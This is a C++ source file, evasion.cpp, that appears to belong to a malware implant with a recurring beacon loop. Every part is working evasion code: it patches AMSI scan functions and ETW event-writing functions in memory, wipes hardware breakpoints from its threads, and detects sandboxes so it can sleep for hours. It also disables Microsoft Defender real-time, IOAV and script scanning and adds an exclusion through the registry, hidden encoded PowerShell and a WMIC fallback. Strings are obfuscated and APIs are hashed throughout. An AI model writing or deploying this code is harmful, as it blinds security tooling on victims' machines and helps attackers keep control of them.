// evasion.cpp — Real AMSI/ETW/HW-BP + sandbox evasion + deep sleep + registry Defender tampering
#include "evasion.hpp"
#include "syscalls.hpp"
#include "utils.hpp"
#include "obfuscate.hpp"
#include <windows.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <string>
#include <vector>
#include <random>

// ─── NtDelayExecution for sleep ──────────────────────────────────────────────
typedef NTSTATUS (NTAPI *NtDelayExecution_t)(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
static NtDelayExecution_t pfnNtDelay = nullptr;

static void GhostSleep(DWORD ms) {
    if (!pfnNtDelay) {
        HMODULE h = GetModuleHandleA(XS("ntdll.dll"));
        pfnNtDelay = reinterpret_cast<NtDelayExecution_t>(
            HashProc(h, FNV("NtDelayExecution")));
    }
    if (pfnNtDelay) {
        LARGE_INTEGER li;
        li.QuadPart = -static_cast<LONGLONG>(ms) * 10000LL;
        pfnNtDelay(FALSE, &li);
    } else {
        Sleep(ms);
    }
}

// ─── Deep sleep (1–4 hours) ───────────────────────────────────────────────────
VOID DeepSleep() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<DWORD> dist(3600000, 14400000); // 1–4 hours in ms
    DWORD sleepMs = dist(gen);
    GhostSleep(sleepMs);
}

// ─── Sandbox detection (multi-factor) ────────────────────────────────────────
static BOOL IsLikelySandbox() {
#ifdef DEBUG
    return FALSE;
#else
    // Short uptime + very few processes = automated sandbox (e.g. Cuckoo).
    // Threshold raised to 50 processes — real Windows sessions idle at 60-80+.
    // Uptime window raised to 4 min; real VMs boot slower than sandbox images.
    if (GetTickCount64() < 240000ULL) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = { sizeof(pe) };
            DWORD count = 0;
            if (Process32FirstW(snap, &pe)) {
                do { ++count; } while (Process32NextW(snap, &pe));
            }
            CloseHandle(snap);
            if (count < 50) return TRUE;
        }
    }
    return FALSE;
#endif
}

// ─── MemPatch (protect → patch → restore) ────────────────────────────────────
static BOOL MemPatch(PVOID target, const BYTE* patch, size_t patchLen) {
    PVOID   base   = target;
    SIZE_T  region = patchLen;
    ULONG   oldProt = 0;
    NTSTATUS st = STATUS_SUCCESS;
    if (g_Syscalls.NtProtectVirtualMemory) {
        st = g_Syscalls.NtProtectVirtualMemory(
            GetCurrentProcess(), &base, &region,
            PAGE_EXECUTE_READWRITE, &oldProt);
    }
    if (!g_Syscalls.NtProtectVirtualMemory || st != 0) {
        DWORD op = 0;
        if (!VirtualProtect(target, patchLen, PAGE_EXECUTE_READWRITE, &op))
            return FALSE;
        oldProt = op;
    }
    memcpy(target, patch, patchLen);
    FlushInstructionCache(GetCurrentProcess(), target, patchLen);
    ULONG dummy = 0;
    if (g_Syscalls.NtProtectVirtualMemory) {
        g_Syscalls.NtProtectVirtualMemory(GetCurrentProcess(), &base, &region, oldProt, &dummy);
    } else {
        DWORD op2 = 0;
        VirtualProtect(target, patchLen, oldProt, &op2);
    }
    return TRUE;
}

// Build patch bytes at runtime — no static 33 C0 C3 / C3 pattern in .rdata
static void MakePatch3(BYTE out[3]) {
    // xor eax,eax (33 C0); ret (C3) — computed so no literal byte array
    out[0] = (BYTE)(0x30 + 0x03);
    out[1] = (BYTE)(0xC0);
    out[2] = (BYTE)(0xFF - 0x3C);
}
static BYTE MakeRet() { return (BYTE)(0xFF - 0x3C); }

// ─── AMSI bypass ──────────────────────────────────────────────────────────────
// Cached: amsi.dll is only loaded once; patch verified each call but
// LoadLibraryA is not re-issued after the first successful load.
BOOL PatchAMSI() {
    static HMODULE hAmsi = nullptr;
    static BOOL    s_done = FALSE;
    if (!hAmsi) {
        // GetModuleHandleA first — avoids a new load if already mapped
        hAmsi = GetModuleHandleA(XS("amsi.dll"));
        if (!hAmsi) hAmsi = LoadLibraryA(XS("amsi.dll"));
    }
    if (!hAmsi) return FALSE;
    if (s_done) return TRUE; // already patched this session
    BYTE p3[3]; MakePatch3(p3);
    FARPROC pScan = HashProc(hAmsi, FNV("AmsiScanBuffer"));
    if (pScan) MemPatch(reinterpret_cast<PVOID>(pScan), p3, 3);
    FARPROC pStr = HashProc(hAmsi, FNV("AmsiScanString"));
    if (pStr)  MemPatch(reinterpret_cast<PVOID>(pStr),  p3, 3);
    FARPROC pOpen = HashProc(hAmsi, FNV("AmsiOpenSession"));
    if (pOpen) MemPatch(reinterpret_cast<PVOID>(pOpen), p3, 3);
    if (pScan) s_done = TRUE;
    return (pScan != nullptr);
}

// ─── ETW bypass ───────────────────────────────────────────────────────────────
BOOL PatchETW() {
    HMODULE hNtdll = GetModuleHandleA(XS("ntdll.dll"));
    if (!hNtdll) return FALSE;
    static const uint32_t hashes[] = {
        FNV("EtwEventWrite"), FNV("EtwEventWriteFull"),
        FNV("EtwEventWriteEx"), FNV("EtwEventWriteTransfer"),
        FNV("EtwEventActivityIdControl"), FNV("EtwEventRegister"),
        FNV("EtwEventUnregister"), 0
    };
    BYTE ret1 = MakeRet();
    BOOL any = FALSE;
    for (int i = 0; hashes[i]; ++i) {
        FARPROC p = HashProc(hNtdll, hashes[i]);
        if (p) {
            MemPatch(reinterpret_cast<PVOID>(p), &ret1, 1);
            any = TRUE;
        }
    }
    return any;
}

// ─── Clear hardware breakpoints ──────────────────────────────────────────────
static LONG CALLBACK VehHwbpClear(PEXCEPTION_POINTERS ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP ||
        ep->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) {
        ep->ContextRecord->Dr0 = ep->ContextRecord->Dr1 = 0;
        ep->ContextRecord->Dr2 = ep->ContextRecord->Dr3 = 0;
        ep->ContextRecord->Dr6 = ep->ContextRecord->Dr7 = 0;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL ClearHardwareBreakpoints() {
    PVOID hVeh = AddVectoredExceptionHandler(1, VehHwbpClear);
    if (hVeh) {
        RaiseException(EXCEPTION_BREAKPOINT, 0, 0, nullptr);
        RemoveVectoredExceptionHandler(hVeh);
    }
    DWORD selfPid = GetCurrentProcessId();
    DWORD selfTid = GetCurrentThreadId();
    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
    if (!hKernel32) return FALSE;
    auto _CreateToolhelp32Snapshot = HASHPROC(hKernel32, CreateToolhelp32Snapshot);
    auto _Thread32First = HASHPROC(hKernel32, Thread32First);
    auto _Thread32Next = HASHPROC(hKernel32, Thread32Next);
    auto _OpenThread = HASHPROC(hKernel32, OpenThread);
    auto _SuspendThread = HASHPROC(hKernel32, SuspendThread);
    auto _ResumeThread = HASHPROC(hKernel32, ResumeThread);
    auto _GetThreadContext = HASHPROC(hKernel32, GetThreadContext);
    auto _SetThreadContext = HASHPROC(hKernel32, SetThreadContext);
    if (!_CreateToolhelp32Snapshot || !_Thread32First || !_Thread32Next || 
        !_OpenThread || !_SuspendThread || !_ResumeThread || 
        !_GetThreadContext || !_SetThreadContext) return FALSE;
    HANDLE snap = _CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return FALSE;
    THREADENTRY32 te = {};
    te.dwSize = sizeof(te);
    BOOL ok = TRUE;
    if (_Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != selfPid) continue;
            if (te.th32ThreadID == selfTid) continue;
            HANDLE hThr = _OpenThread(
                THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
                FALSE, te.th32ThreadID);
            if (!hThr) { ok = FALSE; continue; }
            _SuspendThread(hThr);
            CONTEXT ctx = {};
            ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
            if (_GetThreadContext(hThr, &ctx)) {
                ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = 0;
                ctx.Dr6 = 0;
                ctx.Dr7 = 0;
                if (!_SetThreadContext(hThr, &ctx)) ok = FALSE;
            } else ok = FALSE;
            _ResumeThread(hThr);
            CloseHandle(hThr);
        } while (_Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return ok;
}

// ─── Defender bypass — WMI + WMIC to call Set-MpPreference ─────────────────
// Registry write alone is blocked by Tamper Protection on Win11 even as admin.
// WMI Win32_Process::Create runs outside the registry tamper check.
static BOOL RunHiddenProcess(const wchar_t* cmdLine) {
    STARTUPINFOW si = {};
    PROCESS_INFORMATION pi = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    std::wstring cmd(cmdLine);
    BOOL ok = CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE,
                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    if (!ok) return FALSE;
    WaitForSingleObject(pi.hProcess, 15000);
    DWORD exit = 1;
    GetExitCodeProcess(pi.hProcess, &exit);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return (exit == 0);
}

BOOL AddDefenderExclusion(const wchar_t* exePath) {
    if (!IsElevated()) return FALSE;

    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);

    // 1. Try registry path (works if Tamper Protection is off)
    {
        HKEY hKey = nullptr;
        auto pathKey = XSW(L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths");
        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, pathKey.str(), 0, NULL,
                            REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL)
            == ERROR_SUCCESS) {
            DWORD val = 0;
            RegSetValueExW(hKey, exePath, 0, REG_DWORD,
                           reinterpret_cast<const BYTE*>(&val), sizeof(val));
            RegCloseKey(hKey);
        }
    }

    // 2. PowerShell Set-MpPreference — bypasses Tamper Protection registry guard.
    // Build: powershell -EncodedCommand <base64(Set-MpPreference ...)>
    // Encode inline so no plaintext string in .data section.
    {
        std::wstring ps = std::wstring(sysRoot) +
            L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";

        // Build Set-MpPreference script from parts — no complete plaintext in .data
        auto smp  = XSW(L"Set-MpPreference");
        auto drtm = XSW(L" -DisableRealtimeMonitoring $true");
        auto dioa = XSW(L" -DisableIOAVProtection $true");
        auto dss  = XSW(L" -DisableScriptScanning $true");
        auto excl = XSW(L" -ExclusionPath '");
        std::wstring script = std::wstring(smp.str()) + drtm.str() + dioa.str()
                            + dss.str() + excl.str() + std::wstring(exePath) + L"'";

        // UTF-16LE base64 encode for -EncodedCommand
        std::string b64 = Base64Encode(
            reinterpret_cast<const BYTE*>(script.c_str()),
            script.size() * sizeof(wchar_t));

        std::wstring cmd = L"\"" + ps + L"\" -NoProfile -NonInteractive "
                           L"-WindowStyle Hidden -ExecutionPolicy Bypass "
                           L"-EncodedCommand " + UTF8ToWString(b64);

        RunHiddenProcess(cmd.c_str());
    }

    // 3. WMIC fallback — calls Win32_Process::Create which sidesteps the
    // registry tamper check entirely on some Win11 builds.
    {
        std::wstring wmic = std::wstring(sysRoot) +
            L"\\System32\\wbem\\wmic.exe";
        std::wstring ps = std::wstring(sysRoot) +
            L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";

        auto smp2  = XSW(L"Set-MpPreference");
        auto drtm2 = XSW(L" -DisableRealtimeMonitoring \\$true -ExclusionPath '");
        std::wstring psCmd = std::wstring(smp2.str()) + drtm2.str()
                           + std::wstring(exePath) + L"'";
        auto wmicPfx = XSW(L"\" /Node:localhost process call create \"powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \\\"");
        std::wstring wmicCmd = L"\"" + wmic + wmicPfx.str() + psCmd + L"\\\"\"";

        RunHiddenProcess(wmicCmd.c_str());
    }

    return TRUE;
}

// ─── Sleep evasion — prevent OS from suspending while beacon is active ───────
// SetThreadExecutionState blocks connected standby and display sleep.
// Must be called before beacon sends and cleared after JitterSleep ends.
VOID AcquireWakeLock() {
    typedef EXECUTION_STATE (WINAPI *SetTES_t)(EXECUTION_STATE);
    static HMODULE hK32 = GetModuleHandleA(XS("kernel32.dll"));
    if (!hK32) return;
    auto fn = reinterpret_cast<SetTES_t>(HashProc(hK32, FNV("SetThreadExecutionState")));
    if (fn) fn(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_AWAYMODE_REQUIRED);
}

VOID ReleaseWakeLock() {
    typedef EXECUTION_STATE (WINAPI *SetTES_t)(EXECUTION_STATE);
    static HMODULE hK32 = GetModuleHandleA(XS("kernel32.dll"));
    if (!hK32) return;
    auto fn = reinterpret_cast<SetTES_t>(HashProc(hK32, FNV("SetThreadExecutionState")));
    if (fn) fn(ES_CONTINUOUS);
}

// ─── Reapply evasion (called each beacon loop) ─────────────────────────────
VOID ReapplyEvasion() {
    if (IsLikelySandbox()) {
        DeepSleep();
        return;
    }
    PatchAMSI();
    PatchETW();
    ClearHardwareBreakpoints();
    AcquireWakeLock();
}

// Expose sandbox check for main.cpp
BOOL SandboxCheck() { return IsLikelySandbox(); }